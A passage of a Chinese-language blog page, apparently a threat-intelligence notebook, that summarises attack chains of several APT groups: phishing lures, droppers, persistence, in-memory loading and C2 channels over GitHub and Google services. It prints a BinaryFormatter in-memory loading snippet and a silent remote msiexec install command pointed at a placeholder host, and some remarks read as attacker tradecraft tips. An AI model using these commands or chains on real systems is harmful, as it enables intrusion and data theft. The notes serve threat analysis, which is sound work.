+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);</span><br><span class="line">fmt.Deserialize_2(memoryStream);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dropper释放诱饵文档、持久化bat、下阶段2.hta</li>
+<li>.bat启动mshta.exe 加载 2.hta</li>
+<li>2.hta内嵌Rat Dll，利用 BinaryFormatter 反序列化内存加载</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);</span><br><span class="line">fmt.Deserialize_2(memoryStream);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927001128855.png" alt="image-20260927001128855"></p>
+<p>总结：该组织特点是 <strong>利用hta中的js调用 BinaryFormatter 反序列化加载dll到内存中</strong>，使用开源项目 <a target="_blank" rel="noopener" href="https://github.com/tyranid/DotNetToJScript%EF%BC%8C%E6%8E%A5%E6%94%B6%E4%B8%80%E4%B8%AA.NET">https://github.com/tyranid/DotNetToJScript，接收一个.NET</a> DLL和一个DLL中的类名，生成一个JS脚本，实现将提供的DLL加载到内存中</p>
+<h1 id="分析14"><a href="#分析14" class="headerlink" title="分析14"></a>分析14</h1><p>巴基斯坦 - SideCopy</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/shcduut0TUJ4WeGzFKnYcQ">https://mp.weixin.qq.com/s/shcduut0TUJ4WeGzFKnYcQ</a></p>
+<ul>
+<li>.link 文件钓鱼，启动mshta下载并运行恶意 1.hta</li>
+<li>1.hta内嵌dropper-dll，利用 BinaryFormatter 反序列化内存加载</li>
+<li>dropper-dll 释放诱饵文件、释放loader、写Run注册表持久化</li>
+<li>loader释放带有加密exe的pdf文件</li>
+<li>loader启动powershell，解密并内存加载exe</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927002640292.png" alt="image-20260927002640292"></p>
+<p>总结：无</p>
+<h1 id="分析15"><a href="#分析15" class="headerlink" title="分析15"></a>分析15</h1><p>巴基斯坦 - SideCopy</p>
+<p><a target="_blank" rel="noopener" href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks/">https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks/</a></p>
+<p>钓鱼细节：</p>
+<ul>
+<li>发件人邮件地址：gsosystems-ndc@outlook[.]com 仿照 gsosystems.ndc-mod@nic[.]in</li>
+<li>第一封邮件附件为正常pdf文件</li>
+<li>第二封邮件来自被盗用的官方邮箱地址，主题为更新第一封所提到的内容</li>
+<li>第二封邮件附件为.txt文本，内容指向zip下载链接</li>
+<li>下载链接被托管在 egovservice.in（虚假域名）、nhp.mowr.gov.in</li>
+</ul>
+<p>攻击链路：</p>
+<ul>
+<li>.link 文件钓鱼，启动msiexec 远程安装msi安装包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c msiexec.exe &#x2F;q &#x2F;i https:&#x2F;&#x2F;xxx&#x2F;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>msi运行dropper</li>
+<li>dropper释放：持久化hta、白exe、白dll、黑dll</li>
+<li>白加黑</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927005023042.png" alt="image-20260927005023042"></p>
+<p>总结：前期准备细节要注意：邮箱、域名、以及首封邮件不放出鱼钩</p>
+<h1 id="分析16"><a href="#分析16" class="headerlink" title="分析16"></a>分析16</h1><p>巴基斯坦 - SideCopy</p>
+<p><a target="_blank" rel="noopener" href="https://www.seqrite.com/blog/operation-xenofiscal-sidecopy-deploying-persistent-xenorat-targeting-the-mof-afghanistan/">https://www.seqrite.com/blog/operation-xenofiscal-sidecopy-deploying-persistent-xenorat-targeting-the-mof-afghanistan/</a></p>
+<p>类似分析13，不过在第二阶段引入了shellcode：加载CLR、解密Rat、内存反射加载。并且更新了Rat</p>
+<h1 id="分析17"><a href="#分析17" class="headerlink" title="分析17"></a>分析17</h1><p>台湾地区 - 毒云藤</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6wVfE9SE3wVuazxVppe3tA">https://mp.weixin.qq.com/s/6wVfE9SE3wVuazxVppe3tA</a></p>
+<p><a target="_blank" rel="noopener" href="https://pan1c.org/posts/poisonvine-apt-analysis/">https://pan1c.org/posts/poisonvine-apt-analysis/</a></p>
+<ul>
+<li>混淆.net exe</li>
+<li>远程下载并解密shellcode</li>
+<li>win api 建线程启动Shellcode（CreateThread）</li>
+<li>Shellcode数据内嵌了一份加密payload</li>
+<li>Shellcode解密payload并内存加载（sliver）</li>
+</ul>
+<p>总结：无</p>
+<h1 id="分析18"><a href="#分析18" class="headerlink" title="分析18"></a>分析18</h1><p>巴基斯坦 - APT36、Transparent Tribe、透明部落</p>
+<p><a target="_blank" rel="noopener" href="https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-gogitter-gitshellpad-and-goshell">https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-gogitter-gitshellpad-and-goshell</a></p>
+<ul>
+<li>pdf文档钓鱼邮件，提示消息覆盖一张模糊图片</li>
+<li>特定的 Adobe Acrobat PDF阅读器打开时会 <strong>加载自定义 JavaScript</strong></li>
+<li>展示钓鱼更新消息诱导下载dropper</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260928233738418.png" alt="image-20260928233738418"></p>
+<ul>
+<li>服务器设置guard，特定地区以及UA（windows）可以正常下载</li>
+</ul>
+<p>dropper：</p>
+<ul>
+<li>释放vbs，作用是每30秒从server拉取vb进行执行</li>
+<li>添加计划任务，执行vbs作为权限维持</li>
+<li>内置令牌token从github仓库下载下一阶段zip文件，释放并运行</li>
+</ul>
+<p>c2：</p>
+<ul>
+<li><strong>github 三方上线</strong> c2，简单命令执行</li>
+</ul>
+<p>loader：</p>
+<ul>
+<li>通过上阶段c2下载</li>
+<li>体积膨胀 1G</li>
+<li>通过 QueueUserAPC 执行shellcode</li>
+<li>shellcode：分配内存、解密、运行 cobalt strike beacon</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260928235901913.png" alt="image-20260928235901913"></p>
+<p>总结：PDF消息提示做的挺逼真的</p>
+<h1 id="分析19"><a href="#分析19" class="headerlink" title="分析19"></a>分析19</h1><p>巴基斯坦 - APT36、Transparent Tribe、透明部落</p>
+<p><a target="_blank" rel="noopener" href="https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and">https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and</a></p>
+<ul>
+<li>pdf文档钓鱼邮件，提示消息引导下载下阶段恶意文件</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260929000902760.png" alt="image-20260929000902760"></p>
+<p>dropper：</p>
+<ul>
+<li>下载为zip文件，包含 .link 和 .png</li>
+<li>.link启动powershell</li>
+<li>powershell Assembly.load() 加载.png中的c2</li>
+</ul>
+<p>c2：多种通信途径变种</p>
+<ul>
+<li><strong>Google Sheets 三方上线</strong> - c#</li>
+<li><strong>Google Firebase 三方上线</strong> - powershell</li>
+<li><strong>Microsoft Graph API 三方上线</strong> - Golang</li>
+</ul>
+<p>总结：多种轻量级三方后门c2</p>
+<h1 id="分析20"><a href="#分析20" class="headerlink" title="分析20"></a>分析20</h1><p>巴基斯坦 - APT36、Transparent Tribe、透明部落</p>
+<p><a target="_blank" rel="noopener" href="https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and">https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and</a></p>
+<p>介绍了几种新工具。</p>
+<ul>
+<li>GitHub 三方上线 c2</li>
+<li>powershell <strong>文件窃取工具</strong>，指定目录、盘符、文件类型等然后上传到github</li>
+<li>轻量级 64 位 Windows USB 传播工具，持续监控外部可移动介质，并复制恶意文件到外部驱动器的根目录，一个link、一个zip</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/17/abuse-printers/" rel="prev" title="内网打印机攻击面">
+                  <i class="fa fa-angle-left"></i> 内网打印机攻击面
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
